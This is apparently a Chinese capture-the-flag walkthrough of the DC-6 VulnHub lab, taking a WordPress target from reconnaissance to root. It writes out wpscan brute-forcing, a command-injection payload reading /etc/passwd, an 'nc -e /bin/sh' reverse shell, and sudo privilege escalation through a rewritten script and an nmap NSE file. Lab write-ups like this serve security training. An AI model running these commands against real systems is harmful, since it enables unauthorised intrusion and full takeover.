@@ -1,0 +1,266 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PzAUWDThbeDIMo9zylYj7w)
+
+**01 项目安装**
+-----------
+
+先把 DC-6 的靶机安装到本地
+
+下载地址是：https://www.five86.com/dc-6.html
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGHavV8QtZh0ldv1y8Howfv3asPfKicgW0pp4kx3S0OoPYXDzplJfqQwA/640?wx_fmt=png)
+
+进入页面点击`here` 进行下载
+
+下载好之后，导入咱们的虚拟机
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGKlViboLp06wXpLnEwjljvnc1ep4hn2lvmMrFiae30ptlVhNLM9B5XVjQ/640?wx_fmt=png)
+
+看到这个页面，表示我们靶机安装成功
+
+**02 信息收集**
+-----------
+
+首先我们进行信息收集，获取靶机的 ip 和相关端口
+
+```
+#获取ip地址
+netdiscover -r  192.168.1.0/24
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGhk2WeR2iaE1e1MpV2SVxAzl1obsNMhfWUMwFotzfprwYcCOYVRSACicg/640?wx_fmt=png)
+
+知道了 Ip，看下靶机开放了哪些端口
+
+```
+#获取端口
+nmap -A  192.168.1.148
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGJchcfHaSib6Er2Tib98ABJ7cNUIic0RSBbR4VgNy5iadln7zuQ7IgRdvzA/640?wx_fmt=png)
+
+可以看到靶机开放了 80 端口和 22 端口，访问一下页面
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYG0QT0XuTjuYVvOutFxZ5TnlBtS8Sb80ygiciboowShjRRhLe2J2ZQQF8A/640?wx_fmt=png)
+
+可惜的是访问不了，因为做了域名绑定，所以需要我们在本地做个域名映射，这个和之前 DC-2 是一样的问题
+
+打开 C:\Windows\System32\drivers\etc 下的 hosts 文件
+
+在末尾加入
+
+192.168.1.148   wordy (记住写上自己靶机的 IP)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGr1USicWotIGvtXPbdRd0H425bQ022AmvmRref7MpGNJSk4a8EDQ1EDw/640?wx_fmt=png)
+
+ok，访问成功
+
+当然咱们 kali 也需要进行进行配置
+
+```
+vi  /etc/hosts
+# 将 192.168.1.148   wordy 加入末尾
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGVGOiajWib4mQP5fSqHibcusgfjWmQjibBYjI0YFcwojMbcocaqtV6OjHEg/640?wx_fmt=png)
+
+保存退出
+
+**03 指纹识别**
+-----------
+
+在页面查看一番，很明显这个是 WordPress 开发的，后台也是特定的是 wp-admin，访问一下
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGralGLUwtyURzibDeicxZUsjNMo4kWPNT0Wia2iaic4KcA5icNSSt7gwWVbFQ/640?wx_fmt=png)
+
+后台也获取到
+
+既然已经知道是 WordPress，那我们可以使用一个神器工具 `wpscan` ，这个工具是专门用来扫描 WordPress 漏洞的黑盒子扫描器
+
+在 kali 中执行
+
+```
+# 获取可能存在的用户名
+wpscan  --url  http://wordy/ -e u
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGjRicYkBdDvqxRiayS1yhibyUBibKteRY3H9icBR9VMsUVwr1CGMMQCZgHyA/640?wx_fmt=png)
+
+用户名为：admin，mark，graham，sarah，jens
+
+既然获取到了用户名，现在只需要获得密码，就可以直接爆破
+
+寻找了一番，发现 DC-6 的作者已经把密码告诉我了我们：https://www.vulnhub.com/entry/dc-6,315/
+
+```
+OK, this isn't really a clue as such, but more of some "we don't want to spend five years waiting for a certain process to finish" kind of advice for those who just want to get on with the job.
+
+cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt That should save you a few years. ;-)
+```
+
+在 kali 中执行
+
+```
+cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGTiaicpFCWFtrIKRSDaVKy8RYomL4EkNhI9HLGhTU2ZNz7WMwq8waibCtg/640?wx_fmt=png)
+
+可以看到密码已经获取到
+
+创建个 username.txt 文件，把之前的用户名放入里面，准备开始爆破
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYG5nzFrtUYhxsXmUYXSm0M9w8Su873D3H5ez9NUlvLYyDuftzB7SrvbA/640?wx_fmt=png)
+
+执行
+
+```
+wpscan –url http://wordy –U username.txt –P passwords.txt
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYG5u05U4Cgm1SHXN6OnfCpiayu0RZ6icpibXibWmonFUbVEmaO61lI1B6fTA/640?wx_fmt=png)
+
+获取到账户名为: mark，密码是: helpdesk01
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGfZXla8gIIce4VH6ibS44zicKWPzdIAtXFBiaCbicYFg6kzMUIiaBtGibGz5A/640?wx_fmt=png)
+
+登录成功
+
+**04 漏洞利用**
+-----------
+
+登录后台之后可以看到 `activity monitor`插件，百度了一下，发现这个插件是可以被利用
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGWefybtEH3tL8XszJlKMvwsZicgP9EDmWXpXdHKyotx4EQgicF9zMvseQ/640?wx_fmt=png)
+
+点击 Lookup, 使用 pb 抓包
+
+```
+127.0.0.1|cat /etc/passwd
+```
+
+直接获取了服务器账户信息
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGT2hAxFOdM1HckoExhNfMR3Mqwl3ItYW7ZuCq6ho6YpeIvF92otRUIA/640?wx_fmt=png)
+
+可以反弹 shell
+
+kill 输入
+
+```
+nc -lvvp 1234
+```
+
+在 bp 中输入
+
+```
+nc -e /bin/sh 192.168.1.116 1234
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGl6yZOpmXF2c6VASLhcQeVdQAPeBPGEibOWicJpgv9602HoSEpL2F8Cog/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGJEQ2FvrI8JahgI2uLC5M1DveA76nKQr0NvUibyDIetNX9Au6EldRDGw/640?wx_fmt=png)
+
+获取 shell 成功
+
+执行
+
+```
+#获取正向的shell
+python -c  'import pty;pty.spawn ( "/bin/bash")'
+```
+
+**05 提权**
+---------
+
+在服务器一通查询，发现在 /home/mark/stuff 目录下有个 things-to-do.txt 文件
+
+查看一下发现居然有服务器账号和密码
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGYmdPbDUvc4ltpRlY7TpbvAzOAXtFqHOpx0Svc7RDYfKqFsiaCdMs0fA/640?wx_fmt=png)
+
+graham - GSo7isUM1D4- done
+
+尝试 ssh 登录
+
+```
+ssh graham@127.0.0.1
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGjpx2pL5cJRo3HSricpQV2VJPKooq58rAaZwpYxbJKBhfFLqarEa6ESg/640?wx_fmt=png)
+
+登录成功
+
+在 / home/jens 文件下看到 backups.sh 脚本
+
+执行
+
+```
+sudo -l
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGNnjm8wBZXSNXD7ZmlF0KfsCfs9VyPE4xQf3vlN3K5prnb7TOzJwsibg/640?wx_fmt=png)
+
+发现无密码执行权限，利用这个 sh 脚本可以直接获取到 jens 的 shell
+
+执行一下命令
+
+```
+#将脚本中的内容清空
+cat /dev/null > backups.sh
+
+#将/bin/bash写入backups.sh文件中
+echo "/bin/bash" >> backups.sh
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYG7DQcpkuI7S7gGZeuqU1diaGskUQ4fpYAClVsZKPoDvibkq6tOeR2FTqA/640?wx_fmt=png)
+
+执行
+
+```
+#使用jens用户执行sh脚本文件即可获取shell
+sudo -u jens ./backups.sh
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGfas9EG8o9bbrAQz7WCSWYznnWWjVKiasRpdqBxkUqefoRVvXaFpiaWFw/640?wx_fmt=png)
+
+成功拿到 jens 用户的 shell
+
+执行
+
+```
+#查看jens权限
+sudo -l
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGZ68CJRrUCX0iciahnibT2uEgR6uV7QKJooWntlZ40iaaKibIdFtIeQ256vQ/640?wx_fmt=png)
+
+可以看到这里可以利用 nmap 进行提权
+
+进入 / home/jens 目录，执行下面两条命令
+
+```
+#将os.execute('/bin/bash')写入到root.nse文件中
+echo "os.execute('/bin/bash')" >> root.nse
+
+#利用nmap插件执行 /bin/bash 来获取root权限
+sudo nmap --script=root.nse
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGJKIJaZkgAVsouctGTTBn8cRBnq7WRpyjic1yvv3L21apiaPA6y6B1GzA/640?wx_fmt=png)
+
+可以看到提权成功！
+
+![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MZ82g774DOFNQiawux1CcfYGvtZ62AoJ3Z8eJSKv7dzBTessM5JvGIOgXD6zKibGict3YP5mVTB7OxkQ/640?wx_fmt=png)
+
+获取到目标！
+
+**06 总结**
+---------
+
+1.  熟悉 activity monitor 插件进行漏洞利用
+    
+2.  从服务器中寻找蛛丝马迹，获取其他账户的账户名和密码
+    
+3.  使用服务器脚本获取 shell
+    
+4.  利用 nmap 进行提权操作
